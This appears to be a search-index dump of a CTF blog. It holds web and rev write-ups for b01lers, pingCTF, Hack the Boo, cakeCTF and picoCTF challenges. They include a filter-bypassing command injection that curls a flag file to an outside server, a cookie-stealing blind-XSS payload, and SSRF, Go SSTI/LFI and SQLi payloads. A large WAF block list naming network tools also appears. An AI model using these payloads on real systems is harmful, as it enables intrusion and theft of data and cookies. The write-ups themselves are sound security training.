","date":"2024-04-16","objectID":"/b01lers-2024/:1:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#webb01ler-ad"},{"categories":["CTF","Web","Rev","Misc"],"content":" web/3-city-elves-writeups#command-injection/blind #filter-bypass Command Injection challenge where we need to bypass a blacklisted words and leak a flag.png. To solve this I setup a file upload server after confirming i can do a curl command. Main challenge @app.route(\"/pentest_submitted_flags\", methods=[\"POST\"]) def submit(): if request.is_json: # Retrieve JSON data data = request.json content = data[\"content\"] if sus(content): return jsonify({\"message\": \"The requested URL was rejected. Please consult with your administrator.\"}), 200 else: filename = \"writeup_\" + secrets.token_urlsafe(50) os.system(f\"bash -c \\'echo \\\"{content}\\\" \u003e {filename}\\'\") # Like I care about your writeup os.system(f\"rm -f writeup_{filename}\") return jsonify({\"message\": \"Writeup submitted successfully\"}), 200 else: return jsonify({'error': 'Request data must be in JSON format'}), 400 waf.py def sus(content): taboo = [ \"bin\", \"base64\", \"export\", \"python3\", \"export\", \"ruby\", \"perl\", \"x\", \"/\", \"(\", \")\" \"\\\\\", \"rm\", \"mv\", \"chmod\", \"chown\", \"tar\", \"gzip\", \"bzip2\", \"zip\", \"find\", \"grep\", \"sed\", \"awk\", \"cat\", \"less\", \"more\", \"head\", \"tail\", \"echo\", \"printf\", \"read\", \"touch\", \"ln\", \"wget\", \"curl\", \"fetch\", \"scp\", \"rsync\", \"sudo\", \"ssh\", \"nc\", \"netcat\", \"ping\", \"traceroute\", \"iptables\", \"ufw\", \"firewalld\", \"crontab\", \"ps\", \"top\", \"htop\", \"du\", \"df\", \"free\", \"uptime\", \"kill\", \"killall\", \"nohup\", \"jobs\", \"bg\", \"fg\", \"watch\", \"wc\", \"sort\", \"uniq\", \"tee\", \"diff\", \"patch\", \"mount\", \"umount\", \"lsblk\", \"blkid\", \"fdisk\", \"parted\", \"mkfs\", \"fsck\", \"dd\", \"hdparm\", \"lsmod\", \"modprobe\", \"lsusb\", \"lspci\", \"ip\", \"ifconfig\", \"route\", \"netstat\", \"ss\", \"hostname\", \"dnsdomainname\", \"date\", \"cal\", \"who\", \"w\", \"last\", \"history\", \"alias\", \"export\", \"source\", \"umask\", \"pwd\", \"cd\", \"mkdir\", \"rmdir\", \"stat\", \"file\", \"chattr\", \"lsof\", \"ncdu\", \"dmesg\", \"journalctl\", \"logrotate\", \"systemctl\", \"service\", \"init\", \"reboot\", \"shutdown\", \"poweroff\", \"halt\", \"systemd\", \"update-alternatives\", \"adduser\", \"useradd\", \"userdel\", \"usermod\", \"groupadd\", \"groupdel\", \"groupmod\", \"passwd\", \"chpasswd\", \"userpasswd\", \"su\", \"visudo\", \"chsh\", \"chfn\", \"getent\", \"id\", \"whoami\", \"groups\", \"quota\", \"quotaon\", \"quotacheck\", \"scp\", \"sftp\", \"ftp\", \"tftp\", \"telnet\", \"ssh-keygen\", \"ssh-copy-id\", \"ssh-add\", \"ssh-agent\", \"nmap\", \"tcpdump\", \"iftop\", \"arp\", \"arping\", \"brctl\", \"ethtool\", \"iw\", \"iwconfig\", \"mtr\", \"tracepath\", \"fping\", \"hping3\", \"dig\", \"nslookup\", \"host\", \"whois\", \"ip\", \"route\", \"ifconfig\", \"ss\", \"iptables\", \"firewalld\", \"ufw\", \"sysctl\", \"uname\", \"hostnamectl\", \"timedatectl\", \"losetup\", \"eject\", \"lvm\", \"vgcreate\", \"vgextend\", \"vgreduce\", \"vgremove\", \"vgs\", \"pvcreate\", \"pvremove\", \"pvresize\", \"pvs\", \"lvcreate\", \"lvremove\", \"lvresize\", \"lvs\", \"resize2fs\", \"tune2fs\", \"badblocks\", \"udevadm\", \"pgrep\", \"pkill\", \"atop\", \"iotop\", \"vmstat\", \"sar\", \"mpstat\", \"nmon\", \"finger\", \"ac\", \"journalctl\", \"ls\", \"dir\", \"locate\", \"updatedb\", \"which\", \"whereis\", \"cut\", \"paste\", \"tr\", \"comm\", \"xargs\", \"gunzip\", \"bunzip2\", \"unzip\", \"xz\", \"unxz\", \"lzma\", \"unlzma\", \"7z\", \"ar\", \"cpio\", \"pax\", \"ftp\", \"sftp\", \"ftp\", \"wget\", \"curl\", \"fetch\", \"rsync\", \"scp\", \"ssh\", \"openssl\", \"gpg\", \"pgp\", ] for item in taboo: if item in content.lower(): return True return False We can bypass most of the linux command words using this technique c''url and to bypass the / we can do ${HOME:0:1}. https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions The command I used does a POST request to my file upload server with the /flag.png attached in the body solve.py import os import requests from waf import sus # curl -F data=/flag.png \u003cip:port\u003e payload = \"cu''rl -F \\\"data=@${HOME:0:1}flag.png\\\" \u003credacted\u003e\" content = f\"\"\"123\" ; {payload} ; e''cho \"123\"\"\" assert not sus(content) filename = \"test\" command = f\"bash -c \\'echo \\\"{content}\\\" \u003e {filename}\\'\" print(content) print(command) # os.system(command) url = \"https://threecityelf-53b6fe52e327b2cb.instancer.b01lersc.tf/pentest_submitted_flags\" json = { 'content': content } r = requests.post(url, json=","date":"2024-04-16","objectID":"/b01lers-2024/:2:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#web3-city-elves-writeups"},{"categories":["CTF","Web","Rev","Misc"],"content":" rev","date":"2024-04-16","objectID":"/b01lers-2024/:0:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#rev"},{"categories":["CTF","Web","Rev","Misc"],"content":" rev/Annnnnnny Second NowAnalyze in ghidra and learn that the super_optimized_calculation is not so optimized. It just returns the nth fibonacci number We can just hardcode it and run it will print the flag #include \u003cstdio.h\u003e int main{ unsigned long long uVar1; // .... local_78[20] = 0xc1; local_78[21] = 0x161; local_78[22] = 0x10d; local_78[23] = 0x1e7; local_78[24] = 0xf5; // uVar1 = super_optimized_calculation(0x5a); uVar1 = 2880067194370816120; // 0x5a/90th fibonacci number for (local_84 = 0; local_84 \u003c 0x19; local_84 = local_84 + 1) { putc((int)(uVar1 % (unsigned long long)local_78[(int)local_84]),stdout); } putc(10,stdout); if (local_10 != *(unsigned long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } flag: bctf{what‚Äôs_memoization?} ","date":"2024-04-16","objectID":"/b01lers-2024/:1:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#revannnnnnny-second-now"},{"categories":["CTF","Web","Rev","Misc"],"content":" rev/js-safe#js #deobfuscation The original file provided is obfuscated. which can be deobfuscated here: https://obf-io.deobfuscate.io/ The main challenge is under addToPassword function doing comparisons and operations. Basically, It just checks the index if it matches with the corresponding operation on the right. If we start from the button we will know that arr[3] = 82 and then work up from there. 82 ^ 0x36 = 100 etc.. function addToPassword(_0x43b7e8) { if (guess.length \u003c 0x6) { guess += _0x43b7e8; _0x38a66f(); if (guess.length === 0x6) { let arr = Array(0x6); for (let i = 0x0; i \u003c 0x6; i += 0x1) { arr[i] = guess[i].charCodeAt(0x0); } // 48-57 let _0x4cedc7 = true; _0x4cedc7 \u0026= arr[0x4] == arr[0x1] - 0x4; // a[4] 48 _0x4cedc7 \u0026= arr[0x1] == (arr[0x0] ^ 0x44); // a[1] 52 _0x4cedc7 \u0026= arr[0x0] == arr[0x2] - 0x7; _0x4cedc7 \u0026= arr[0x3] == (arr[0x2] ^ 0x25); // a[3] 82 _0x4cedc7 \u0026= arr[0x5] == (arr[0x0] ^ 0x14); _0x4cedc7 \u0026= arr[0x4] == arr[0x1] - 0x4; _0x4cedc7 \u0026= arr[0x0] == (arr[0x3] ^ 0x22); _0x4cedc7 \u0026= arr[0x0] == arr[0x2] - 0x7; // a[0] 112 _0x4cedc7 \u0026= arr[0x0] == arr[0x5] + 0xc; // a[0] 112 _0x4cedc7 \u0026= arr[0x2] == arr[0x4] + 0x47; // a[2] 119 _0x4cedc7 \u0026= arr[0x2] == (arr[0x5] ^ 0x13); // a[2] 119 _0x4cedc7 \u0026= arr[0x5] == (arr[0x3] ^ 0x36); // a[5] 100 _0x4cedc7 \u0026= 0x52 == arr[0x3]; // a[3] 82 // 112 52 119 82 48 100 = \"p4wR0d\" if (_0x4cedc7) { document.getElementById(\"display\").classList.add(\"correct\"); let _0x401b01 = CryptoJS.AES.decrypt(\"U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw\", guess).toString(CryptoJS.enc.Utf8); // let _0x401b01 = CryptoJS.AES.decrypt(\"U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw\", \"p4wR0d\").toString(CryptoJS.enc.Utf8); console.log(_0x401b01); document.getElementById(\"display\").textContent = _0x401b01; } else { document.getElementById(\"display\").classList.add(\"wrong\"); } } } } After getting the key p4wR0d we can just decrypt it using the following: CryptoJS.AES.decrypt(\"U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw\", \"p4wR0d\").toString(CryptoJS.enc.Utf8); flag: bctf{345y-p4s5w0rd-\u003ew\u003c} ","date":"2024-04-16","objectID":"/b01lers-2024/:2:0","series":null,"tags":["XSS","Command-Injection","Filter-bypass","Minecraft","Python","Jail","bash","Javascript","Deobfuscation","Code-Review"],"title":"b01lers CTF 2024 - writeups","uri":"/b01lers-2024/#revjs-safe"},{"categories":["CTF","Web"],"content":"User-Agent, Path Traversal, Blind XSS","date":"2023-12-11","objectID":"/pingctf-2023/","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/"},{"categories":["CTF","Web"],"content":"Raw solutions for solved pingCTF 2023 Web challenges ","date":"2023-12-11","objectID":"/pingctf-2023/:0:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#"},{"categories":["CTF","Web"],"content":" web/internet-explorerChallenge: Manipulate the User agent so that the looks like a linux running internet explorer. GET / HTTP/2 Host: internet-explorer.knping.pl User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Linux x86_64) Useful site: https://www.useragentstring.com/pages/Internet%20Explorer/ ","date":"2023-12-11","objectID":"/pingctf-2023/:0:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#webinternet-explorer"},{"categories":["CTF","Web"],"content":" web/youtube-trailerChallenge: The only provided information was the youtube link. solution: Simply find the flag in the source firefox \"view-source:https://www.youtube.com/watch?v=siZPvEGrtNY\" # Search for \"ping{\" using ctrl+F ","date":"2023-12-11","objectID":"/pingctf-2023/:0:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#webyoutube-trailer"},{"categories":["CTF","Web"],"content":" web/path-traversal-101Challenge: Bypass the input validation to perform Path Traversal tasks.js: import path from \"path\"; const preTask = (solution) =\u003e { if (typeof solution !== \"string\") { throw new Error(\"Solution must be a string\"); } if (solution.length \u003e 512) { throw new Error(\"Solution must be less than 512 characters\"); } if (solution === \"flag\") { throw new Error(\"Your solution can't be 'flag'\"); } if (solution === \"./flag\") { throw new Error(\"Your solution can't be './flag'\"); } }; export const task1 = (solution) =\u003e { preTask(solution); if (!solution.startsWith(\"/robot\") || solution.endsWith(\"/flag\")) { throw new Error( `You cannot access the flag (task1)!!! You are UNAUTHORIZED!!! Solution:\\n ${solution}, \\n ${path.join(\"/\", solution)}` ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\"; }; export const task2 = (solution) =\u003e { preTask(solution); solution = solution.replaceAll(\"../\", \"\"); if (solution === \"/flag\") { throw new Error( `You cannot ACCESS the flag (task2)!!! You are UNAUTHORIZED!!! Solution:\\n ${solution}, \\n ${path.join(\"/\", solution)}` ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\"; }; export const task3 = (solution) =\u003e { preTask(solution); if (solution.includes(\"../\") || solution === \"/flag\") { throw new Error( `You CANNOT ACCESS the flag (task3)!!! You are UNAUTHORIZED!!! Solution:\\n ${solution}, \\n ${path.join(\"/\", solution)}` ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\"; }; export const tasks = [ `if (!solution.startsWith(\"/robot\") || solution.endsWith(\"/flag\")) { throw new Error( \"You cannot access the flag!!! You are UNAUTHORIZED!!! ü§ñü§ñü§ñü§ñü§ñ\" ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\";`, `solution = solution.replaceAll(\"../\", \"\"); if (solution === \"/flag\") { throw new Error( \"You cannot ACCESS the flag!!! You are UNAUTHORIZED!!! ü§ñü§ñü§ñü§ñü§ñ\" ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\";`, `if (solution.includes(\"../\") || solution === \"/flag\") { throw new Error( \"You CANNOT ACCESS the flag!!! You are UNAUTHORIZED!!! ü§ñü§ñü§ñü§ñü§ñ\" ); } const solutionPath = path.join(\"/\", solution); return solutionPath === \"/flag\";`, ]; ","date":"2023-12-11","objectID":"/pingctf-2023/:0:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#webpath-traversal-101"},{"categories":["CTF","Web"],"content":" SolutionsChallenge 1 POST /%F0%9F%A4%96 HTTP/2 Host: path-traversal-101.knping.pl Cookie: token=\u003ctoken\u003e; Path=/ User-Agent: robot Content-Type: application/x-www-form-urlencoded solution=/robot/../flag/. Challenge 2 POST /%F0%9F%A4%96 HTTP/2 Host: path-traversal-101.knping.pl Cookie: token=\u003ctoken\u003e; Path=/ User-Agent: robot Content-Type: application/x-www-form-urlencoded solution=../flag/. Challenge 3 POST /%F0%9F%A4%96 HTTP/2 Host: path-traversal-101.knping.pl Cookie: token=\u003ctoken\u003e; Path=/ User-Agent: robot Content-Type: application/x-www-form-urlencoded solution=././flag/. ","date":"2023-12-11","objectID":"/pingctf-2023/:1:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#solutions"},{"categories":["CTF","Web"],"content":" web/i-see-no-vulnerabilityChallenge: Perform Blind XSS and retrieve admin cookie ","date":"2023-12-11","objectID":"/pingctf-2023/:0:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#webi-see-no-vulnerability"},{"categories":["CTF","Web"],"content":" SolutionI found out that I can inject JavaScript in the script tag because it is not sanitized by the DOMPurify. Vulnerable Code Blind-XSS payload \" + function(){ flag = document.cookie; new Image().src=\"http://\u003credacted\u003e?flag=\"+ flag; return 1}(); document.getElementById(\"vision\").textContent = text; // Generate PNG with payload Setup listener server then report the image to get the flag =) ","date":"2023-12-11","objectID":"/pingctf-2023/:1:0","series":null,"tags":["Header Injection","Path Traversal","XSS","OCR","Code Review","JavaScript","express"],"title":"pingCTF 2023 - web(4x) writeups","uri":"/pingctf-2023/#solution"},{"categories":["CTF","Web"],"content":"Basic SSRF and Go SSTI + LFI","date":"2023-10-28","objectID":"/hacktheboo-2023/","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/"},{"categories":["CTF","Web"],"content":"Write-up for Hack the Boo 2023 web challenges I participated in Hack The Boo 2023 and solved all the web challenges (2/2) ","date":"2023-10-28","objectID":"/hacktheboo-2023/:0:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#"},{"categories":["CTF","Web"],"content":" HauntMart#ssrf #flask Description: HauntMart, a beloved Halloween webstore, has fallen victim to a curse, bringing its products to life. You must explore its ghostly webpages, and break the enchantment before Halloween night. Can you save Spooky Surprises from its supernatural woes?. Difficulty: Easy ","date":"2023-10-28","objectID":"/hacktheboo-2023/:0:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#hauntmart"},{"categories":["CTF","Web"],"content":" AnalysisThe Challenge provides a source code for the web application. It is written in Flask. The first step i do is to search flag in VSCode. routes.py /home route @web.route('/home', methods=['GET']) @isAuthenticated def homeView(user): return render_template('index.html', user=user, flag=current_app.config['FLAG']) index.html template \u003cdiv class=\"container-fluid\"\u003e \u003ca class=\"navbar-brand\" href=\"#\"\u003eHauntMart\u003c/a\u003e \u003cbutton class=\"navbar-toggler\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#navbarColor03\" aria-controls=\"navbarColor03\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"\u003e \u003cspan class=\"navbar-toggler-icon\"\u003e\u003c/span\u003e \u003c/button\u003e \u003cdiv class=\"collapse navbar-collapse\" id=\"navbarColor03\"\u003e \u003cul class=\"navbar-nav ms-auto\"\u003e {% if user['role'] == 'admin' %} {{flag}} {% endif %} \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link active\" href=\"/home\"\u003eHome \u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" href=\"/product\"\u003eSell Product\u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" href=\"#\"\u003eCart\u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" href=\"#\"\u003eProfile\u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" href=\"/logout\"\u003eLogout\u003c/a\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e The code shows that the way to get the flag is to have a user with the role of ‚Äòadmin‚Äô Looking other parts of the code I found an interesting endpoint to make the user an admin. However it is only reachable when it is from localhost. routes.py addAdmin route api.route('/addAdmin', methods=['GET']) @isFromLocalhost def addAdmin(): username = request.args.get('username') if not username: return response('Invalid username'), 400 result = makeUserAdmin(username) if result: return response('User updated!') return response('Invalid username'), 400 @isFromLocalhost middleware def isFromLocalhost(func): @wraps(func) def check_ip(*args, **kwargs): if request.remote_addr != \"127.0.0.1\": return abort(403) return func(*args, **kwargs) return check_ip After learning this functionality, I thought that the way to exploit it is by finding an SSRF. This is the next step I took. Navigating the website this looks like an ecommerce web application where the user can sell products. After logging in, we can see a product list Home and a Sell Product page where the ff: is shown: Notice the interesting field Manual Url. If we look at the source code of the Sell Product. we can see that the manualPath provided is passed into a downloadManual function routes.py sellProduct route @api.route('/product', methods=['POST']) @isAuthenticated def sellProduct(user): if not request.is_json: return response('Invalid JSON!'), 400 data = request.get_json() name = data.get('name', '') price = data.get('price', '') description = data.get('description', '') manualUrl = data.get('manual', '') if not name or not price or not description or not manualUrl: return response('All fields are required!'), 401 manualPath = downloadManual(manualUrl) if (manualPath): addProduct(name, description, price) return response('Product submitted! Our mods will review your request') return response('Invalid Manual URL!'), 400 routes.py downloadManual function def downloadManual(url): safeUrl = isSafeUrl(url) if safeUrl: try: local_filename = url.split(\"/\")[-1] r = requests.get(url) with open(f\"/opt/manualFiles/{local_filename}\", \"wb\") as f: for chunk in r.iter_content(chunk_size=1024): if chunk: f.write(chunk) return True except: return False return False The downloadManual function shows that its performing a request.get which can be used to request for the /addAdmin route. At this point I can just do a request through the Manual URL field to upgrade my user to an admin. However there is an isSafeURL function being run before performing the request. isSafeURL function blocked_host = [\"127.0.0.1\", \"localhost\", \"0.0.0.0\"] def isSafeUrl(url): for hosts in blocked_host: if hosts in url: return False return True We can see that there is a list of not allowed URL. ","date":"2023-10-28","objectID":"/hacktheboo-2023/:1:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#analysis"},{"categories":["CTF","Web"],"content":" Solution (SSRF)If I can bypass the isSafeUrl function. I can request to the makeAdmin to make my user an admin. The payload i used was http://0:1337/api/addAdmin?username=admin to upgrade my user called admin to an admin. Note: the port and the endpoint for addAdmin can be inferred from the routes and the run.py. Visit the Home page to get the flag. ","date":"2023-10-28","objectID":"/hacktheboo-2023/:2:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#solution-ssrf"},{"categories":["CTF","Web"],"content":" Flag ","date":"2023-10-28","objectID":"/hacktheboo-2023/:3:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#flag"},{"categories":["CTF","Web"],"content":" Ghostly Templates#SSTI/Go #LFI Description: In the dark corners of the internet, a mysterious website has been making waves among the cybersecurity community. This site, known for its Halloween-themed templates, has sparked rumors of an eerie secret lurking beneath the surface. Will you delve into this dark and spooky webapp to uncover the hidden truth? Difficulty: Medium ","date":"2023-10-28","objectID":"/hacktheboo-2023/:0:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#ghostly-templates"},{"categories":["CTF","Web"],"content":" AnalysisThe application looks like it loads a template from a link After analysis of the source code. The function that interests me is the getTpl function. This is where the logic of the frontend is processed. main.go getTpl function func getTpl(w http.ResponseWriter, r *http.Request) { var page string = r.URL.Query().Get(\"page\") var remote string = r.URL.Query().Get(\"remote\") if page == \"\" { http.Error(w, \"Missing required parameters\", http.StatusBadRequest) return } reqData := \u0026RequestData{} userIPCookie, err := r.Cookie(\"user_ip\") clientIP := \"\" if err == nil { clientIP = userIPCookie.Value } else { clientIP = strings.Split(r.RemoteAddr, \":\")[0] } userAgent := r.Header.Get(\"User-Agent\") locationInfo, err := reqData.GetLocationInfo(\"https://freeipapi.com/api/json/\" + clientIP) if err != nil { http.Error(w, \"Could not fetch IP location info\", http.StatusInternalServerError) return } reqData.ClientIP = clientIP reqData.ClientUA = userAgent reqData.ClientIpInfo = *locationInfo reqData.ServerInfo.Hostname = GetServerInfo(\"hostname\") reqData.ServerInfo.OS = GetServerInfo(\"cat /etc/os-release | grep PRETTY_NAME | cut -d '\\\"' -f 2\") reqData.ServerInfo.KernelVersion = GetServerInfo(\"uname -r\") reqData.ServerInfo.Memory = GetServerInfo(\"free -h | awk '/^Mem/{print $2}'\") var tmplFile string if remote == \"true\" { tmplFile, err = readRemoteFile(page) if err != nil { http.Error(w, \"Internal Server Error\", http.StatusInternalServerError) return } } else { if !reqData.IsSubdirectory(\"./\", TEMPLATE_DIR+\"/\"+page) { http.Error(w, \"Internal Server Error\", http.StatusInternalServerError) return } tmplFile = reqData.OutFileContents(TEMPLATE_DIR + \"/\" + page) } tmpl, err := template.New(\"page\").Parse(tmplFile) if err != nil { http.Error(w, \"Internal Server Error\", http.StatusInternalServerError) return } err = tmpl.Execute(w, reqData) if err != nil { http.Error(w, \"Internal Server Error\", http.StatusInternalServerError) return } } After going through the code and researching I learned that we can read a remote file if remote is set to true. The remote file can be a go template file that can access the variables from reqData struct when parsed. RequestData, LocationInfo and MachineInfo struct for context type LocationInfo struct { Status string `json:\"status\"` Country string `json:\"country\"` CountryCode string `json:\"countryCode\"` Region string `json:\"region\"` RegionName string `json:\"regionName\"` City string `json:\"city\"` Zip string `json:\"zip\"` Lat float64 `json:\"lat\"` Lon float64 `json:\"lon\"` Timezone string `json:\"timezone\"` ISP string `json:\"isp\"` Org string `json:\"org\"` AS string `json:\"as\"` Query string `json:\"query\"` } type MachineInfo struct { Hostname string OS string KernelVersion string Memory string } type RequestData struct { ClientIP string ClientUA string ServerInfo MachineInfo ClientIpInfo LocationInfo `json:\"location\"` } Using the above structure , I can render variables from reqData using this format. {{ .ClientIP }} {{ .ClientUA }} {{ .ClientIpInfo.IpVersion }} {{ .ClientIpInfo.IpAddress }} {{ .ServerInfo.Hostname }} {{ .ServerInfo.OS }} ","date":"2023-10-28","objectID":"/hacktheboo-2023/:1:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#analysis-1"},{"categories":["CTF","Web"],"content":" Solution (SSTI + LFI)I learned that I can define my own go template and access the variables passed on the reqData. I also learned there is a method passed in the template called OutFileContents func (p RequestData) OutFileContents(filePath string) string { data, err := os.ReadFile(filePath) if err != nil { return err.Error() } return string(data) } This means that I can read out any file by calling the method in the template {{ .OutFileContents \"file.txt\" }} I hosted the template file flag.tpl and requested it from the web application. flag.tpl \u003cscript\u003e alert({{ .OutFileContents \"../flag.txt\" }}) \u003c/script\u003e An example, A request to my custom go template would look like this /view?page=http://\u003cip\u003e/flag.tpl\u0026remote=true ","date":"2023-10-28","objectID":"/hacktheboo-2023/:2:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#solution-ssti--lfi"},{"categories":["CTF","Web"],"content":" Flag ","date":"2023-10-28","objectID":"/hacktheboo-2023/:3:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#flag-1"},{"categories":["CTF","Web"],"content":" References https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md https://exploit-notes.hdks.org/exploit/web/go-ssti/ https://blog.logrocket.com/using-golang-templates/ ","date":"2023-10-28","objectID":"/hacktheboo-2023/:0:0","series":null,"tags":["SSRF","SSTI","LFI","Code Review","Python","flask","Go"],"title":"Hack the Boo 2023 - web(2x) writeups ","uri":"/hacktheboo-2023/#references"},{"categories":["CTF","Web"],"content":"SQLi through length validation","date":"2023-11-11","objectID":"/country-db/","series":null,"tags":["SQLi","Code Review","Python","flask"],"title":"cakeCTF 2023 - web/CountryDB","uri":"/country-db/"},{"categories":["CTF","Web"],"content":"Write-up for CakeCTF Web challenge - CountryDB ","date":"2023-11-11","objectID":"/country-db/:0:0","series":null,"tags":["SQLi","Code Review","Python","flask"],"title":"cakeCTF 2023 - web/CountryDB","uri":"/country-db/#"},{"categories":["CTF","Web"],"content":" DescriptionDo you know which country code ‚ÄòCA‚Äô and ‚ÄòKE‚Äô are for? Search country codes here! Backend Code #!/usr/bin/env python3 import flask import sqlite3 import json app = flask.Flask(__name__) def db_search(code): with sqlite3.connect('database.db') as conn: cur = conn.cursor() cur.execute(f\"SELECT name FROM country WHERE code=UPPER('{code}')\") found = cur.fetchone() return None if found is None else found[0] @app.route('/') def index(): return flask.render_template(\"index.html\") @app.route('/api/search', methods=['POST']) def api_search(): req = flask.request.get_json() print(req) if 'code' not in req: flask.abort(400, \"Empty country code\") code = req['code'] print(code) print(len(code)) if len(code) != 2 or \"'\" in code: flask.abort(400, \"Invalid country code\") name = db_search(code) if name is None: flask.abort(404, \"No such country\") return {'name': name} if __name__ == '__main__': app.run(debug=True) ","date":"2023-11-11","objectID":"/country-db/:0:0","series":null,"tags":["SQLi","Code Review","Python","flask"],"title":"cakeCTF 2023 - web/CountryDB","uri":"/country-db/#description"},{"categories":["CTF","Web"],"content":" SolutionSend a json that contains a code with its value set to another json. There should be 2 objects inside that json, so that when the length is checked, it will be a length of the json(dict in python). When interpreted it will be the first key of the json object. {\"code\":{\"CA') UNION SELECT flag from FLAG--\": \"cake\", \"KE\": \"bruh\" }} flag CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut} ","date":"2023-11-11","objectID":"/country-db/:0:0","series":null,"tags":["SQLi","Code Review","Python","flask"],"title":"cakeCTF 2023 - web/CountryDB","uri":"/country-db/#solution"},{"categories":["CTF","Web"],"content":"SQLi/sqlite and Java Code Review","date":"2023-03-29","objectID":"/picoctf-2023/","series":null,"tags":["SQLi","JWT","Cryptographic Failures","Code Review","Java"],"title":"picoCTF 2023 - web(2x) writeups","uri":"/picoctf-2023/"},{"categories":["CTF","Web"],"content":"Writeups for solved Web challenges @picoCTF2023 Our team- joyuriz participated in picoCTF 2023. We scored 3600 points! My writeups web/Java Code Analysis (JWT, hardcoded key, Java) web/More SQLi (SQLi/union, sqlite) Team Writeups ","date":"2023-03-29","objectID":"/picoctf-2023/:0:0","series":null,"tags":["SQLi","JWT","Cryptographic Failures","Code Review","Java"],"title":"picoCTF 2023 - web(2x) writeups","uri":"/picoctf-2023/#"},{"categories":null,"content":" I‚Äôm xeunwa, a penetration tester from the Philippines specializing in Web. Currently a beginner learning my way around. My interests are in CTF, Web, Scripting, Code Reviews, Anime, Noodles, Idols, Icons. ","date":"2023-08-08","objectID":"/whoami/:0:0","series":null,"tags":null,"title":"whoami","uri":"/whoami/#"},{"categories":null,"content":" Certifications INE Web Penetration Tester (eWPTv2) Certified AppSec Pentester (CAPen) Certified AppSec 